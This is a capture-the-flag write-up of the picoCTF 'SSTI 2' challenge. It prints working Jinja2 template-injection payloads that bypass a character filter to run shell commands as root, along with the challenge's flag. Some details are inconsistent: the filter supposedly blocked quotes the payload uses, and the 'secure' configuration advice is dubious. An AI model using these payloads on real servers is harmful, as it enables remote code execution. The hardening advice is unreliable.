# **SSTI 2 - Server-Side Template Injection Bypass Writeup**

## **Challenge Information**
- **Challenge Name:** SSTI 2
- **Author:** Venax
- **Category:** Web Exploitation
- **Difficulty:** Medium

## **Challenge Description**
The challenge presents a web application that allows users to announce messages. The developer claims to have implemented input sanitization by removing problematic characters. The application uses server-side templating, which hints at a potential Server-Side Template Injection (SSTI) vulnerability.

## **Initial Reconnaissance**

### **1. Website Analysis**
- Accessed the provided URL
- Found a simple input form that echoes user input
- Submitted "hello there" → displayed "hello there" on screen

### **2. SSTI Detection**
Tested basic SSTI payloads to identify template engine:

**Payload Tested:** `{{7*7}}`
**Result:** Output displayed `49`

**Conclusion:** The application is vulnerable to SSTI and uses **Jinja2/Django** template engine (confirmed by mathematical operation execution).

## **Exploitation Attempt**

### **3. Initial Command Execution Test**
Attempted to execute system commands using a standard SSTI payload:

**Payload:** `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`

**Result:** Server error - indicating the presence of character filtering/sanitization.

### **4. Understanding the Filter**
The error message confirmed that the developer implemented input sanitization, likely blocking:
- Dots (`.`)
- Underscores (`_`)
- Brackets (`[` `]`)
- Quotes (`'` `"`)
- Possibly other special characters used in Python object traversal

### **5. Bypass Research**
Researched SSTI bypass techniques and found relevant payloads from:
- **PayloadsAllTheThings GitHub repository**
- Specifically: [Python SSTI Bypasses - Django](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#django)

### **6. Crafting Filter-Bypass Payload**
Used hexadecimal encoding to bypass character filters:

**Final Payload:**
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f') ('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

**Breakdown:**
- `\x5f` = `_` (underscore in hex)
- Uses `attr()` method instead of dot notation
- Uses `request` object as entry point
- Chains method calls with pipe operators (`|`)
- Encodes restricted characters in hexadecimal

## **Exploitation Process**

### **7. Initial Command Execution**
**Payload:** `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f') ('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}`

**Result:**
```
uid=0(root) gid=0(root) groups=0(root)
```

**Success!** Confirmed:
- Command execution works
- We're running as root
- Filter bypass successful

### **8. Directory Listing**
**Payload:** (Modified from previous, changing command to `ls`)
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f') ('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
```

**Result:**
```
__pycache__ app.py flag requirements.txt
```

Found interesting files:
- `app.py` - Main application file
- `flag` - Target file
- `requirements.txt` - Python dependencies
- `__pycache__` - Python cache directory

### **9. Reading the Flag**
**Payload:** (Modified to read the flag file)
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f') ('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```

**Result:**
```
picoCTF{sst1_f1lt3r_byp4ss_63b833cd}
```

## **Flag**
**`picoCTF{sst1_f1lt3r_byp4ss_63b833cd}`**

## **Vulnerability Analysis**

### **Root Cause:**
1. **Unsafe Template Rendering:** User input was directly rendered in templates without proper sanitization
2. **Inadequate Filtering:** The character filter was bypassable using hexadecimal encoding
3. **Dangerous Template Features:** The template engine allowed access to Python built-ins and system modules

### **Technical Details:**
- **Template Engine:** Jinja2/Django
- **Bypass Method:** Hexadecimal encoding of restricted characters
- **Attack Vector:** Object traversal using `attr()` method and pipe operators
- **Impact:** Remote Code Execution (RCE) as root

## **Mitigation Recommendations**

### **1. Secure Template Usage:**
```python
# Dangerous (Vulnerable)
template = Template(user_input)
return template.render()

# Safe (Use Context)
template = Template("Hello {{ name }}")
return template.render(name=sanitized_user_input)
```

### **2. Input Validation:**
- Use allowlists instead of blocklists
- Validate input against expected patterns
- Reject any input containing template syntax

### **3. Sandboxing:**
- Use template engines with sandboxing features
- Restrict access to dangerous functions and objects
- Implement template environment restrictions

### **4. Additional Security Measures:**
```python
# Configure Jinja2 with security settings
from jinja2 import Environment, FileSystemLoader, select_autoescape

env = Environment(
    loader=FileSystemLoader('templates'),
    autoescape=select_autoescape(['html', 'xml']),
    # Disable dangerous features
    line_statement_prefix=None,
    line_comment_prefix=None,
    trim_blocks=True,
    lstrip_blocks=True,
    # Enable sandbox
    # sandboxed=True  # If available
)
```

## **Key Learning Points**

1. **SSTI Detection:** Mathematical operations (`{{7*7}}`) are reliable for detecting template injection
2. **Filter Bypass:** Character filters can often be bypassed using:
   - Hexadecimal encoding (`\x5f` for `_`)
   - Alternative syntax (`attr()` instead of dots)
   - String concatenation
3. **Object Traversal:** Understanding Python object hierarchy is crucial for SSTI exploitation
4. **Defense Depth:** Single-layer filtering is insufficient; implement multiple security controls

## **Tools & Resources Used**
- Browser for manual testing
- PayloadsAllTheThings GitHub repository for bypass techniques
- Basic understanding of Python object model and template engines

## **Time to Solve:** ~15-20 minutes

## **Difficulty Assessment:**
- **Concept:** Medium (requires understanding of SSTI and filter bypass)
- **Execution:** Easy (once bypass technique is identified)
- **Overall:** Medium

This challenge demonstrates the importance of proper input sanitization and the dangers of incomplete security measures in web applications.
